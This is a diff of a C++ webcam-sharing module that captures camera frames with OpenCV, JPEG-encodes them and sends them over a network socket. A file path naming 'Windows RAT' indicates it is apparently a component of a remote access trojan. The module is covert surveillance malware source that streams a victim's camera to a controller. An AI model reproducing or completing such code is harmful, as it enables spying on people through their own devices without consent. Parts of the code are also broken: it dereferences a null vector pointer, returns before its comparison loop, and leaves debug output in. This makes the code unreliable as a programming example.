@@ -3,9 +3,11 @@
 //
 
 #include "ShareCamera.h"
-#include <windows.h>
+//#include <windows.h>
 
-ShareCamera::ShareCamera() {}
+ShareCamera::ShareCamera(SOCKET sock) {
+    socket = sock;
+}
 
 
 
@@ -14,6 +16,8 @@ ShareCamera::ShareCamera() {}
 vector<int32_t> *ShareCamera::compareFrames(Mat *frame_1, Mat *frame_2) {
 
     vector<int32_t> *changedBytes = {};
+    changedBytes->push_back(htonl(frame_1->cols));
+    changedBytes->push_back(htonl(frame_1->rows));
 
     for (int x = 0; x < frame_1->cols; x++) {
         for (int y = 0; y < frame_1->rows; y++) {
@@ -35,21 +39,28 @@ vector<int32_t> *ShareCamera::compareFrames(Mat *frame_1, Mat *frame_2) {
     return changedBytes;
 }
 
-void ShareCamera::ShareCameraLive(SOCKET socket) {
+void ShareCamera::ShareCameraLive() {
 
     //Sending frame1 for the first time
     VideoCapture camera(0);
-
-
+    vector<int32_t> *changedBytes = {};
+    vector<uchar> imgTest = {};
     if (!camera.isOpened()) {       //If there is no a camera or cant open the camera
         send(socket, "Can't open the camera", sizeof("Can't open the camera"), 0);
+        return;
     }
 
     camera >> frame1;
-    send(socket, reinterpret_cast<const char *>(frame1.data), frame1.total() * frame1.elemSize(), 0);
+    cout << frame1.cols << endl;
+    cout << frame1.rows << endl;
 
-    vector<int32_t> *changedBytes = {};
+    imencode(".jpg", frame1, imgTest);
+    send(socket, reinterpret_cast<const char *>(imgTest.data()), imgTest.size() * sizeof(uchar), 0);
+    //send(socket, reinterpret_cast<const char *>(frame1.data), frame1.total() * frame1.elemSize(), 0);
+    imwrite("C:\\Users\\avita\\PycharmProjects\\Windows RAT\\Original_Image.jpg", frame1);
 
+
+    return;
     try {  //Comparing and sending frame1 and frame2
         while (true) {
 
@@ -66,5 +77,6 @@ void ShareCamera::ShareCameraLive(SOCKET socket) {
     }
     catch (exception &e) {          //Catching any exception
         cout << e.what() << endl;
+        cout << "Test Test Test Test Test Test Test Test" << endl;
     }
 }
